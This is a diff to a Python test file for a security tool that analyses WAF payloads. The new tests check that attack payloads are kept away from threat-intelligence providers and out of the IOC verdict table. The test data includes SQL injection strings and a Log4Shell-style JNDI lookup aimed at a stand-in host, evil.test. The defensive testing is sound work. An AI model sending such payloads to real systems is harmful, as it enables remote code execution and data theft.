@@ -25,9 +25,15 @@ import unittest
 
 import dataclasses
 
+from config import Settings
+from core.orchestrator import PROVIDER_KEYS, RESULT_KEYS as _RESULT_KEY_MAP
+from core.pipeline import EnrichmentInput, run_enrichment
 from core.waf_payload_analyzer import analyze_waf_payload, to_rows
 from core.waf_payload_parser import parse_waf_field
 from ioc.parser import parse_iocs
+
+# Keys a provider-lookup result dict must carry, as the orchestrator returns them.
+_RESULT_KEYS = tuple(_RESULT_KEY_MAP.values())
 from ioc.verdict import summarize_results
 
 SQLI_LINE = "/login?user= | ' OR '1'='1"
@@ -211,16 +217,60 @@ class TestProviderIsolation(unittest.TestCase):
         block = text[start:text.index("}", start)]
         self.assertNotIn("waf_payload", block)
 
-    def test_waf_field_is_parsed_before_provider_dispatch(self) -> None:
-        # Ordering still matters for readability even though the WAF list can
-        # no longer leak into ``items``: the field should be resolved ahead
-        # of the provider_flags computation in the enrichment block.
-        from pathlib import Path
+    def test_no_payload_text_is_ever_handed_to_a_provider(self) -> None:
+        """The claim, asserted against a real run rather than source ordering.
 
-        text = (Path(__file__).resolve().parents[1] / "app.py").read_text(encoding="utf-8")
-        parse_at = text.index("_waf_items = parse_waf_field(")
-        dispatch_at = text.index("provider_flags = {p: bool(_payload(p))")
-        self.assertLess(parse_at, dispatch_at)
+        This used to grep ``app.py`` for the parse call sitting above the
+        dispatch call, because the enrichment block lived at module scope and
+        could not be imported. It now lives in :mod:`core.pipeline`, so the
+        guarantee can be checked directly: run the pipeline with a payload and
+        an ordinary IOC side by side, and inspect everything the providers were
+        actually offered.
+        """
+        payload_line = "/api/data | ${jndi:ldap://evil.test/a}"
+        seen: list[tuple] = []
+
+        def _spy_lookup(settings, provider_flags, payload_for, allow_urlscan_submit):
+            for provider in provider_flags:
+                seen.extend(payload_for(provider))
+            return {key: {} for key in _RESULT_KEYS}, {"providers": {}, "providers_total": 0.0}
+
+        result = run_enrichment(
+            EnrichmentInput(
+                items=parse_iocs("8.8.8.8"),
+                waf_payloads=parse_waf_field(payload_line),
+            ),
+            settings=Settings(),
+            allowed_for=lambda items: {i.type: set(PROVIDER_KEYS) for i in items},
+            lookup=_spy_lookup,
+        )
+
+        # The payload was analysed …
+        self.assertEqual(len(result["waf_analysis"]), 1)
+        # … and the ordinary IOC was still dispatched …
+        self.assertIn(("8.8.8.8", "ip", False), seen)
+        # … but nothing carrying payload text was ever offered to a provider.
+        for value, ioc_type, _ in seen:
+            self.assertNotIn("jndi", value.lower())
+            self.assertNotEqual(ioc_type, "waf_payload")
+
+    def test_payloads_never_reach_the_verdict_rows(self) -> None:
+        """A payload must not add a row or a verdict count to the IOC table."""
+        result = run_enrichment(
+            EnrichmentInput(
+                items=parse_iocs("8.8.8.8"),
+                waf_payloads=parse_waf_field("/login | ' OR 1=1--"),
+            ),
+            settings=Settings(),
+            allowed_for=lambda items: {},
+            lookup=lambda **kw: (
+                {key: {} for key in _RESULT_KEYS}, {"providers": {}, "providers_total": 0.0}
+            ),
+        )
+
+        self.assertEqual([r["Artifact"] for r in result["rows"]], ["8.8.8.8"])
+        self.assertEqual(result["summary"]["total"], 1)
+        self.assertEqual(len(result["waf_rows"]), 1)
 
 
 if __name__ == "__main__":
